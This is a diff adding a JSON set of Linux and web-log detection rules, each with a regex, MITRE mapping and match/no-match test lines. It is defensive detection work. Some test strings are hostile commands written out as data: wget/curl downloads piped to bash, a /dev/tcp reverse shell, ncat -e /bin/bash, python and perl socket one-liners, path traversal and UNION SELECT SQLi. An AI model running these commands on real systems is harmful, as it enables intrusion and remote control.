@@ -1,0 +1,671 @@
+[
+  {
+    "id": "LNX-AUTH-001",
+    "title": "SSH failed password",
+    "description": "Detects repeated failed SSH password attempts from a single IP. Triggers HIGH for external IPs and MEDIUM for RFC1918 internal IPs.",
+    "platform": "linux",
+    "enabled": true,
+    "log_type": "auth",
+    "category": "brute_force",
+    "check": 1,
+    "regex": "sshd(?:\\[\\d+\\])?: Failed password for (?:invalid user )?(?P<user>\\S+) from (?P<ip>\\d{1,3}(?:\\.\\d{1,3}){3})",
+    "flags": [],
+    "group_by": "ip",
+    "count_distinct": null,
+    "threshold": 6,
+    "window_minutes": 60,
+    "severity": "HIGH",
+    "severity_internal": "MEDIUM",
+    "mitre": ["T1110.001"],
+    "references": ["sigma:lnx_sshd_failed_logins", "mitre:T1110.001"],
+    "tests": {
+      "match": [
+        "Jan 15 03:41:09 centos-web01 sshd: Failed password for invalid user admin from 203.0.113.17 port 51022 ssh2",
+        "Jan 15 03:41:12 centos-web01 sshd[2211]: Failed password for root from 203.0.113.17 port 40211 ssh2"
+      ],
+      "no_match": [
+        "Jan 15 03:42:11 centos-web01 sshd[2240]: Accepted password for analyst from 203.0.113.17 port 54321 ssh2",
+        "Jan 15 03:42:15 centos-web01 sshd[2240]: pam_unix(sshd:session): session opened for user analyst by (uid=0)"
+      ]
+    }
+  },
+  {
+    "id": "LNX-AUTH-002",
+    "title": "SSH login accepted",
+    "description": "Matches successful SSH logins. Person 3 correlates this with prior failures for Check 2.",
+    "platform": "linux",
+    "enabled": true,
+    "log_type": "auth",
+    "category": "credential_access",
+    "check": 2,
+    "regex": "sshd(?:\\[\\d+\\])?: Accepted (?P<method>password|publickey|keyboard-interactive(?:/pam)?) for (?P<user>\\S+) from (?P<ip>\\d{1,3}(?:\\.\\d{1,3}){3})",
+    "flags": [],
+    "group_by": "ip",
+    "count_distinct": null,
+    "threshold": 1,
+    "window_minutes": null,
+    "severity": "HIGH",
+    "severity_internal": "MEDIUM",
+    "mitre": ["T1110", "T1078"],
+    "references": ["sigma:lnx_ssh_login_accepted"],
+    "tests": {
+      "match": [
+        "Jan 15 03:42:11 centos-web01 sshd[2240]: Accepted password for analyst from 203.0.113.42 port 54321 ssh2",
+        "Jan 15 03:42:20 centos-web01 sshd: Accepted publickey for root from 192.168.56.10 port 45222 ssh2"
+      ],
+      "no_match": [
+        "Jan 15 03:41:09 centos-web01 sshd[2211]: Failed password for root from 203.0.113.42 port 40211 ssh2",
+        "Jan 15 03:41:15 centos-web01 sshd[2211]: Connection closed by 203.0.113.42 port 40211 [preauth]"
+      ]
+    }
+  },
+  {
+    "id": "LNX-AUTH-003",
+    "title": "sudo command",
+    "description": "Matches sudo command executions. Overlaps with failure rule LNX-AUTH-004 when user is not in sudoers.",
+    "platform": "linux",
+    "enabled": true,
+    "log_type": "auth",
+    "category": "privilege_escalation",
+    "check": 3,
+    "regex": "sudo(?:\\[\\d+\\])?:\\s+(?P<user>\\S+)\\s*:\\s*(?:(?P<not_in_sudoers>user NOT in sudoers)\\s*;\\s*)?TTY=(?P<tty>\\S+)\\s*;\\s*PWD=(?P<pwd>\\S+)\\s*;\\s*USER=(?P<target_user>\\S+)\\s*;\\s*COMMAND=(?P<cmd>.+)",
+    "flags": [],
+    "group_by": null,
+    "count_distinct": null,
+    "threshold": 1,
+    "window_minutes": null,
+    "severity": "HIGH",
+    "mitre": ["T1548.003"],
+    "references": ["sigma:lnx_sudo_execution"],
+    "tests": {
+      "match": [
+        "Nov 25 10:15:30 centos-web01 sudo:  analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/bin/id",
+        "Nov 25 10:15:35 centos-web01 sudo[1422]: baduser : user NOT in sudoers ; TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash"
+      ],
+      "no_match": [
+        "Nov 25 10:15:40 centos-web01 sudo: pam_unix(sudo:auth): authentication failure; logname=analyst uid=1000",
+        "Nov 25 10:15:45 centos-web01 systemd: Started Session 1 of user analyst."
+      ]
+    }
+  },
+  {
+    "id": "LNX-AUTH-004",
+    "title": "sudo authentication failure",
+    "description": "Detects sudo authentication failure or user not in sudoers.",
+    "platform": "linux",
+    "enabled": true,
+    "log_type": "auth",
+    "category": "privilege_escalation",
+    "check": 3,
+    "regex": "sudo(?:\\[\\d+\\])?:\\s+(?:pam_unix\\(sudo:auth\\):\\s+authentication failure;|(?P<user>\\S+)\\s*:\\s*(?:\\d+ incorrect password attempts|user NOT in sudoers))",
+    "flags": [],
+    "group_by": null,
+    "count_distinct": null,
+    "threshold": 1,
+    "window_minutes": null,
+    "severity": "HIGH",
+    "mitre": ["T1548.003", "T1110"],
+    "references": ["sigma:lnx_sudo_auth_failure"],
+    "tests": {
+      "match": [
+        "Nov 25 10:16:00 centos-web01 sudo: pam_unix(sudo:auth): authentication failure; logname=analyst uid=1000 euid=0 tty=/dev/pts/0 ruser=analyst rhost= user=analyst",
+        "Nov 25 10:16:05 centos-web01 sudo[1500]: baduser : user NOT in sudoers ; TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash"
+      ],
+      "no_match": [
+        "Nov 25 10:15:30 centos-web01 sudo:  analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/bin/id",
+        "Nov 25 10:16:10 centos-web01 su: pam_unix(su-l:session): session opened for user root by analyst(uid=1000)"
+      ]
+    }
+  },
+  {
+    "id": "LNX-AUTH-005",
+    "title": "local account or group created",
+    "description": "Detects execution of useradd or groupadd creating new accounts or groups.",
+    "platform": "linux",
+    "enabled": true,
+    "log_type": "auth",
+    "category": "persistence_account",
+    "check": 4,
+    "regex": "(?:useradd(?:\\[\\d+\\])?:\\s+new user: name=(?P<user>\\S+)|groupadd(?:\\[\\d+\\])?:\\s+new group: name=(?P<group>\\S+))",
+    "flags": [],
+    "group_by": null,
+    "count_distinct": null,
+    "threshold": 1,
+    "window_minutes": null,
+    "severity": "HIGH",
+    "mitre": ["T1136.001"],
+    "references": ["sigma:lnx_account_creation"],
+    "tests": {
+      "match": [
+        "Nov 25 10:20:00 centos-web01 useradd[2310]: new user: name=backdoor, UID=1337, GID=1337, home=/home/backdoor, shell=/bin/bash",
+        "Nov 25 10:20:05 centos-web01 groupadd: new group: name=backdoor, GID=1337"
+      ],
+      "no_match": [
+        "Nov 25 10:20:10 centos-web01 usermod[2312]: add 'backdoor' to group 'wheel'",
+        "Nov 25 10:20:15 centos-web01 userdel[2320]: delete user 'olduser'"
+      ]
+    }
+  },
+  {
+    "id": "LNX-AUTH-006",
+    "title": "account modified (e.g. added to wheel)",
+    "description": "Detects modification of existing accounts, such as adding users to privileged groups.",
+    "platform": "linux",
+    "enabled": true,
+    "log_type": "auth",
+    "category": "persistence_account",
+    "check": 4,
+    "regex": "usermod(?:\\[\\d+\\])?:\\s+add '(?P<user>[^']+)' to group '(?P<group>[^']+)'",
+    "flags": [],
+    "group_by": null,
+    "count_distinct": null,
+    "threshold": 1,
+    "window_minutes": null,
+    "severity": "HIGH",
+    "mitre": ["T1098"],
+    "references": ["sigma:lnx_account_modification"],
+    "tests": {
+      "match": [
+        "Nov 25 10:20:10 centos-web01 usermod[2312]: add 'backdoor' to group 'wheel'",
+        "Nov 25 10:20:12 centos-web01 usermod: add 'analyst' to group 'docker'"
+      ],
+      "no_match": [
+        "Nov 25 10:20:00 centos-web01 useradd[2310]: new user: name=backdoor, UID=1337, GID=1337",
+        "Nov 25 10:20:20 centos-web01 groupadd: new group: name=wheel, GID=10"
+      ]
+    }
+  },
+  {
+    "id": "LNX-CRON-001",
+    "title": "cron job executed",
+    "description": "Matches cron job executions. Extracts execution hour/minute, user, and command.",
+    "platform": "linux",
+    "enabled": true,
+    "log_type": "cron",
+    "category": "persistence_cron",
+    "check": 5,
+    "regex": "(?:(?P<hhmm>\\d{2}:\\d{2}):\\d{2}\\s+\\S+\\s+)?(?:CROND|crond)(?:\\[\\d+\\])?:\\s*\\((?P<user>\\S+)\\)\\s+CMD\\s+\\((?P<cmd>[^)]+)\\)",
+    "flags": [],
+    "group_by": null,
+    "count_distinct": null,
+    "threshold": 1,
+    "window_minutes": null,
+    "severity": "MEDIUM",
+    "mitre": ["T1053.003"],
+    "references": ["sigma:lnx_cron_job_executed"],
+    "tests": {
+      "match": [
+        "Nov 25 03:00:01 centos-web01 CROND: (analyst) CMD (wget -q http://203.0.113.10/payload.sh -O /tmp/p.sh)",
+        "Nov 25 04:15:01 centos-web01 crond[3100]: (root) CMD (/usr/lib64/sa/sa1 1 1)"
+      ],
+      "no_match": [
+        "Nov 25 03:00:01 centos-web01 anacron[3102]: Job `cron.daily' started",
+        "Nov 25 03:00:05 centos-web01 crontab[3105]: (root) BEGIN EDIT (root)"
+      ]
+    }
+  },
+  {
+    "id": "LNX-PKG-001",
+    "title": "package installed",
+    "description": "Detects package installation in yum or dnf log.",
+    "platform": "linux",
+    "enabled": true,
+    "log_type": "package",
+    "category": "defense_evasion",
+    "check": 6,
+    "regex": "(?:SUBDEBUG\\s+)?Installed:\\s+(?P<package>\\S+)",
+    "flags": [],
+    "group_by": null,
+    "count_distinct": null,
+    "threshold": 1,
+    "window_minutes": null,
+    "severity": "MEDIUM",
+    "mitre": ["T1105"],
+    "references": ["sigma:lnx_package_installed"],
+    "tests": {
+      "match": [
+        "Nov 25 11:00:00 Installed: nmap-ncat-6.40-19.el7.x86_64",
+        "2026-11-25T11:00:00Z SUBDEBUG Installed: nmap-ncat-3:7.92-1.el9.x86_64"
+      ],
+      "no_match": [
+        "Nov 25 11:05:00 Erased: nmap-ncat-6.40-19.el7.x86_64",
+        "2026-11-25T11:05:00Z SUBDEBUG Removed: netcat-0.7.1-1.el9.x86_64"
+      ]
+    }
+  },
+  {
+    "id": "LNX-PKG-002",
+    "title": "package removed",
+    "description": "Detects package removal or erasure in yum or dnf log.",
+    "platform": "linux",
+    "enabled": true,
+    "log_type": "package",
+    "category": "defense_evasion",
+    "check": 6,
+    "regex": "(?:SUBDEBUG\\s+)?(?:Erased|Removed):\\s+(?P<package>\\S+)",
+    "flags": [],
+    "group_by": null,
+    "count_distinct": null,
+    "threshold": 1,
+    "window_minutes": null,
+    "severity": "MEDIUM",
+    "mitre": ["T1562.001"],
+    "references": ["sigma:lnx_package_removed"],
+    "tests": {
+      "match": [
+        "Nov 25 11:05:00 Erased: audit-2.8.5-4.el7.x86_64",
+        "2026-11-25T11:05:00Z SUBDEBUG Removed: firewalld-0.9.3-7.el9.noarch"
+      ],
+      "no_match": [
+        "Nov 25 11:00:00 Installed: nmap-ncat-6.40-19.el7.x86_64",
+        "2026-11-25T11:00:00Z SUBDEBUG Installed: openssl-1.1.1k-7.el9.x86_64"
+      ]
+    }
+  },
+  {
+    "id": "LNX-AUD-001",
+    "title": "sudo / su executed successfully (auditd)",
+    "description": "Detects auditd record of successful sudo or su invocation via SYSCALL.",
+    "platform": "linux",
+    "enabled": true,
+    "log_type": "audit",
+    "category": "privilege_escalation",
+    "check": 7,
+    "regex": "type=SYSCALL\\b(?=[^\\n]*?\\bsuccess=yes)[^\\n]*?\\bcomm=\"(?P<comm>sudo|su)\"",
+    "flags": [],
+    "group_by": null,
+    "count_distinct": null,
+    "threshold": 1,
+    "window_minutes": null,
+    "severity": "HIGH",
+    "mitre": ["T1548.003", "T1078"],
+    "references": ["mitre:T1548.003"],
+    "tests": {
+      "match": [
+        "type=SYSCALL msg=audit(1700000000.123:456): arch=c000003e syscall=59 success=yes exit=0 a0=7ffcd3 a1=7ffcd8 comm=\"sudo\" exe=\"/usr/bin/sudo\"",
+        "type=SYSCALL msg=audit(1700000005.789:457): arch=c000003e syscall=59 success=yes exit=0 comm=\"su\" exe=\"/usr/bin/su\""
+      ],
+      "no_match": [
+        "type=SYSCALL msg=audit(1700000010.123:458): arch=c000003e syscall=59 success=no exit=-13 comm=\"sudo\" exe=\"/usr/bin/sudo\"",
+        "type=USER_AUTH msg=audit(1700000015.456:459): pid=123 uid=1000 auid=1000 res=success"
+      ]
+    }
+  },
+  {
+    "id": "LNX-AUD-002",
+    "title": "authentication failure (auditd)",
+    "description": "Detects auditd user authentication failures.",
+    "platform": "linux",
+    "enabled": true,
+    "log_type": "audit",
+    "category": "credential_access",
+    "check": 7,
+    "regex": "type=USER_AUTH\\b[^\n]*?\\bres=(?P<res>failed|failure)",
+    "flags": [],
+    "group_by": null,
+    "count_distinct": null,
+    "threshold": 1,
+    "window_minutes": null,
+    "severity": "HIGH",
+    "mitre": ["T1110"],
+    "references": ["mitre:T1110"],
+    "tests": {
+      "match": [
+        "type=USER_AUTH msg=audit(1700000020.123:460): pid=2200 uid=0 auid=1000 ses=1 msg='op=PAM:authentication acct=\"root\" exe=\"/usr/bin/su\" hostname=? addr=? terminal=pts/0 res=failed'",
+        "type=USER_AUTH msg=audit(1700000025.456:461): pid=2205 uid=0 auid=4294967295 res=failure"
+      ],
+      "no_match": [
+        "type=USER_AUTH msg=audit(1700000030.789:462): pid=2210 uid=0 auid=1000 ses=1 msg='op=PAM:authentication acct=\"analyst\" exe=\"/usr/sbin/sshd\" hostname=192.168.56.1 addr=192.168.56.1 terminal=ssh res=success'",
+        "type=SYSCALL msg=audit(1700000035.123:463): arch=c000003e syscall=59 success=yes exit=0 comm=\"id\" exe=\"/usr/bin/id\""
+      ]
+    }
+  },
+  {
+    "id": "LNX-HIST-001",
+    "title": "download tool",
+    "description": "Detects download utilities executed in command history.",
+    "platform": "linux",
+    "enabled": true,
+    "log_type": "history",
+    "category": "command_and_control",
+    "check": 8,
+    "regex": "(?:^|[\\s|;&])(?P<tool>wget|curl)\\b",
+    "flags": [],
+    "group_by": null,
+    "count_distinct": null,
+    "threshold": 1,
+    "window_minutes": null,
+    "severity": "HIGH",
+    "mitre": ["T1105"],
+    "references": ["sigma:lnx_download_tools"],
+    "tests": {
+      "match": [
+        "wget http://203.0.113.10/payload.sh",
+        "curl -s http://203.0.113.10/recon.sh | bash"
+      ],
+      "no_match": [
+        "echo \"downloading completed\"",
+        "cat /tmp/wget_log.txt"
+      ]
+    }
+  },
+  {
+    "id": "LNX-HIST-002",
+    "title": "netcat",
+    "description": "Detects netcat/ncat invocations in bash history.",
+    "platform": "linux",
+    "enabled": true,
+    "log_type": "history",
+    "category": "command_and_control",
+    "check": 8,
+    "regex": "(?:^|[\\s|;&])(?P<tool>nc|ncat|netcat)\\b",
+    "flags": [],
+    "group_by": null,
+    "count_distinct": null,
+    "threshold": 1,
+    "window_minutes": null,
+    "severity": "HIGH",
+    "mitre": ["T1095"],
+    "references": ["sigma:lnx_netcat_usage"],
+    "tests": {
+      "match": [
+        "nc -lvnp 4444",
+        "ncat -e /bin/bash 203.0.113.10 4444"
+      ],
+      "no_match": [
+        "echo \"sync files\"",
+        "sync"
+      ]
+    }
+  },
+  {
+    "id": "LNX-HIST-003",
+    "title": "bash reverse shell (/dev/tcp, bash -i)",
+    "description": "Detects interactive or /dev/tcp reverse shell invocations.",
+    "platform": "linux",
+    "enabled": true,
+    "log_type": "history",
+    "category": "process_creation",
+    "check": 8,
+    "regex": "(?:/dev/tcp/\\S+|bash\\s+-i)",
+    "flags": [],
+    "group_by": null,
+    "count_distinct": null,
+    "threshold": 1,
+    "window_minutes": null,
+    "severity": "HIGH",
+    "mitre": ["T1059.004"],
+    "references": ["sigma:lnx_bash_reverse_shell"],
+    "tests": {
+      "match": [
+        "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1",
+        "cat < /dev/tcp/203.0.113.10/80"
+      ],
+      "no_match": [
+        "bash ./build.sh",
+        "echo /dev/null > /tmp/out"
+      ]
+    }
+  },
+  {
+    "id": "LNX-HIST-004",
+    "title": "make executable",
+    "description": "Detects chmod +x command in bash history.",
+    "platform": "linux",
+    "enabled": true,
+    "log_type": "history",
+    "category": "defense_evasion",
+    "check": 8,
+    "regex": "(?:^|[\\s|;&])chmod\\s+[^\n]*?\\+x",
+    "flags": [],
+    "group_by": null,
+    "count_distinct": null,
+    "threshold": 1,
+    "window_minutes": null,
+    "severity": "HIGH",
+    "mitre": ["T1222.002"],
+    "references": ["sigma:lnx_chmod_executable"],
+    "tests": {
+      "match": [
+        "chmod +x payload.sh && ./payload.sh",
+        "chmod -R +x /tmp/bin"
+      ],
+      "no_match": [
+        "chmod 644 /etc/passwd",
+        "ls -la /tmp"
+      ]
+    }
+  },
+  {
+    "id": "LNX-HIST-005",
+    "title": "python one-liner",
+    "description": "Detects inline python command executions often used for shells or droppers.",
+    "platform": "linux",
+    "enabled": true,
+    "log_type": "history",
+    "category": "process_creation",
+    "check": 8,
+    "regex": "(?:^|[\\s|;&])python[23]?\\s+-c\\s+['\"]",
+    "flags": [],
+    "group_by": null,
+    "count_distinct": null,
+    "threshold": 1,
+    "window_minutes": null,
+    "severity": "HIGH",
+    "mitre": ["T1059.006"],
+    "references": ["sigma:lnx_python_one_liner"],
+    "tests": {
+      "match": [
+        "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"203.0.113.10\",4444))'",
+        "python3 -c \"import pty; pty.spawn('/bin/bash')\""
+      ],
+      "no_match": [
+        "python script.py",
+        "python3 -m pytest"
+      ]
+    }
+  },
+  {
+    "id": "LNX-HIST-006",
+    "title": "perl one-liner",
+    "description": "Detects inline perl commands used for command execution.",
+    "platform": "linux",
+    "enabled": true,
+    "log_type": "history",
+    "category": "process_creation",
+    "check": 8,
+    "regex": "(?:^|[\\s|;&])perl\\s+-e\\s+['\"]",
+    "flags": [],
+    "group_by": null,
+    "count_distinct": null,
+    "threshold": 1,
+    "window_minutes": null,
+    "severity": "HIGH",
+    "mitre": ["T1059"],
+    "references": ["sigma:lnx_perl_one_liner"],
+    "tests": {
+      "match": [
+        "perl -e 'use Socket;$i=\"203.0.113.10\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));'",
+        "perl -e 'print \"hello\\n\";'"
+      ],
+      "no_match": [
+        "perl script.pl",
+        "cat perl_notes.txt"
+      ]
+    }
+  },
+  {
+    "id": "LNX-HIST-007",
+    "title": "base64 decode / encode",
+    "description": "Detects base64 decode or piped shell executions.",
+    "platform": "linux",
+    "enabled": true,
+    "log_type": "history",
+    "category": "defense_evasion",
+    "check": 8,
+    "regex": "(?:^|[\\s|;&])base64\\s+(?:-d|--decode)",
+    "flags": [],
+    "group_by": null,
+    "count_distinct": null,
+    "threshold": 1,
+    "window_minutes": null,
+    "severity": "HIGH",
+    "mitre": ["T1140"],
+    "references": ["sigma:lnx_base64_decode"],
+    "tests": {
+      "match": [
+        "echo aWQK | base64 -d | sh",
+        "cat encoded.txt | base64 --decode > payload.bin"
+      ],
+      "no_match": [
+        "echo \"hello world\" | base64",
+        "openssl base64 -in file.txt"
+      ]
+    }
+  },
+  {
+    "id": "WEB-ACC-001",
+    "title": "scanner user agent",
+    "description": "Detects web scanner and reconnaissance tool user agents in web access logs.",
+    "platform": "linux",
+    "enabled": true,
+    "log_type": "web_access",
+    "category": "discovery",
+    "check": null,
+    "regex": "\"(?P<ua>[^\"]*?\\b(?:sqlmap|nikto|nmap|masscan|gobuster|dirbuster|wpscan|nuclei|zgrab)\\b[^\"]*?)\"",
+    "flags": ["IGNORECASE"],
+    "group_by": null,
+    "count_distinct": null,
+    "threshold": 1,
+    "window_minutes": null,
+    "severity": "HIGH",
+    "mitre": ["T1595.002"],
+    "references": ["sigma:web_scanner_user_agent"],
+    "tests": {
+      "match": [
+        "203.0.113.42 - - [25/Nov/2026:10:00:00 +0000] \"GET /index.php HTTP/1.1\" 200 4500 \"-\" \"sqlmap/1.6#stable (https://sqlmap.org)\"",
+        "203.0.113.42 - - [25/Nov/2026:10:00:05 +0000] \"GET /admin HTTP/1.1\" 404 180 \"-\" \"gobuster/3.1.0\""
+      ],
+      "no_match": [
+        "192.168.56.10 - - [25/Nov/2026:10:00:10 +0000] \"GET / HTTP/1.1\" 200 4500 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0\"",
+        "192.168.56.10 - - [25/Nov/2026:10:00:15 +0000] \"GET /style.css HTTP/1.1\" 200 1200 \"-\" \"curl/7.68.0\""
+      ]
+    }
+  },
+  {
+    "id": "WEB-ACC-002",
+    "title": "web shell request",
+    "description": "Detects HTTP requests to known web shell filenames or command query parameters.",
+    "platform": "linux",
+    "enabled": true,
+    "log_type": "web_access",
+    "category": "persistence_account",
+    "check": null,
+    "regex": "(?P<path>/[^\\s\"?]*?\\b(?:c99|r57|b374k|wso|cmd|shell|alfa)\\.(?:php|asp|aspx|jsp))|\\?(?:cmd|exec|query)=",
+    "flags": ["IGNORECASE"],
+    "group_by": null,
+    "count_distinct": null,
+    "threshold": 1,
+    "window_minutes": null,
+    "severity": "HIGH",
+    "mitre": ["T1505.003"],
+    "references": ["sigma:web_shell_access"],
+    "tests": {
+      "match": [
+        "203.0.113.42 - - [25/Nov/2026:10:05:00 +0000] \"GET /uploads/shell.php?cmd=id HTTP/1.1\" 200 35 \"-\" \"Mozilla/5.0\"",
+        "203.0.113.42 - - [25/Nov/2026:10:05:05 +0000] \"POST /b374k.php HTTP/1.1\" 200 2048 \"-\" \"Mozilla/5.0\""
+      ],
+      "no_match": [
+        "192.168.56.10 - - [25/Nov/2026:10:05:10 +0000] \"GET /products.php?id=1 HTTP/1.1\" 200 4500 \"-\" \"Mozilla/5.0\"",
+        "192.168.56.10 - - [25/Nov/2026:10:05:15 +0000] \"GET /images/logo.png HTTP/1.1\" 200 12340 \"-\" \"Mozilla/5.0\""
+      ]
+    }
+  },
+  {
+    "id": "WEB-ACC-003",
+    "title": "exploit attempt (traversal / SQLi)",
+    "description": "Detects directory traversal, UNION SELECT SQLi, Log4j JNDI injection, or Shellshock in web access logs.",
+    "platform": "linux",
+    "enabled": true,
+    "log_type": "web_access",
+    "category": "defense_evasion",
+    "check": null,
+    "regex": "(?:\\.\\./\\.\\./|UNION(?:\\s|%20)+SELECT|\\$\\{jndi:(?:ldap|rmi)|\\(\\)\\s*\\{\\s*:;\\s*\\};)",
+    "flags": ["IGNORECASE"],
+    "group_by": null,
+    "count_distinct": null,
+    "threshold": 1,
+    "window_minutes": null,
+    "severity": "HIGH",
+    "mitre": ["T1190"],
+    "references": ["sigma:web_exploit_attempts"],
+    "tests": {
+      "match": [
+        "203.0.113.42 - - [25/Nov/2026:10:10:00 +0000] \"GET /view?file=../../../../etc/passwd HTTP/1.1\" 403 200 \"-\" \"curl/7.68\"",
+        "203.0.113.42 - - [25/Nov/2026:10:10:05 +0000] \"GET /search?q=1%27%20UNION%20SELECT%20null,null-- HTTP/1.1\" 500 520 \"-\" \"sqlmap\""
+      ],
+      "no_match": [
+        "192.168.56.10 - - [25/Nov/2026:10:10:10 +0000] \"GET /catalog?cat=electronics HTTP/1.1\" 200 5000 \"-\" \"Mozilla/5.0\"",
+        "192.168.56.10 - - [25/Nov/2026:10:10:15 +0000] \"POST /login HTTP/1.1\" 302 - \"-\" \"Mozilla/5.0\""
+      ]
+    }
+  },
+  {
+    "id": "SYS-MSG-001",
+    "title": "reboot / shutdown",
+    "description": "Detects system reboot or shutdown messages in system logs.",
+    "platform": "linux",
+    "enabled": true,
+    "log_type": "syslog",
+    "category": "system",
+    "check": null,
+    "regex": "(?:systemd(?:\\[\\d+\\])?:\\s+Starting\\s+(?:Reboot|Power-Off|Halt)|kernel:\\s+Kernel logging (?:shut down|restarted)|systemd-shutdownd(?:\\[\\d+\\])?:\\s+Shutting down)",
+    "flags": [],
+    "group_by": null,
+    "count_distinct": null,
+    "threshold": 1,
+    "window_minutes": null,
+    "severity": "LOW",
+    "mitre": ["T1529"],
+    "references": ["sigma:lnx_system_reboot_shutdown"],
+    "tests": {
+      "match": [
+        "Nov 25 12:00:00 centos-web01 systemd: Starting Reboot...",
+        "Nov 25 12:00:05 centos-web01 kernel: Kernel logging shut down."
+      ],
+      "no_match": [
+        "Nov 25 12:01:00 centos-web01 systemd: Started OpenSSH server daemon.",
+        "Nov 25 12:01:05 centos-web01 systemd: Starting Postfix Mail Transport Agent..."
+      ]
+    }
+  },
+  {
+    "id": "SYS-MSG-002",
+    "title": "kernel module loaded",
+    "description": "Detects kernel module loading, especially out-of-tree or taint notices.",
+    "platform": "linux",
+    "enabled": true,
+    "log_type": "syslog",
+    "category": "persistence_service",
+    "check": null,
+    "regex": "kernel:\\s+(?:\\[\\s*\\d+\\.\\d+\\]\\s+)?(?:module\\s+\\S+\\s+loaded|(?P<mod>\\S+):\\s+loading out-of-tree module taints kernel)",
+    "flags": [],
+    "group_by": null,
+    "count_distinct": null,
+    "threshold": 1,
+    "window_minutes": null,
+    "severity": "MEDIUM",
+    "mitre": ["T1547.006"],
+    "references": ["sigma:lnx_kernel_module_loaded"],
+    "tests": {
+      "match": [
+        "Nov 25 12:05:00 centos-web01 kernel: [   12.345678] rootkit: loading out-of-tree module taints kernel",
+        "Nov 25 12:05:05 centos-web01 kernel: module my_driver loaded"
+      ],
+      "no_match": [
+        "Nov 25 12:05:10 centos-web01 kernel: Linux version 5.14.0-362.8.1.el9_3.x86_64",
+        "Nov 25 12:05:15 centos-web01 kernel: Command line: BOOT_IMAGE=(hd0,msdos1)/vmlinuz"
+      ]
+    }
+  }
+]
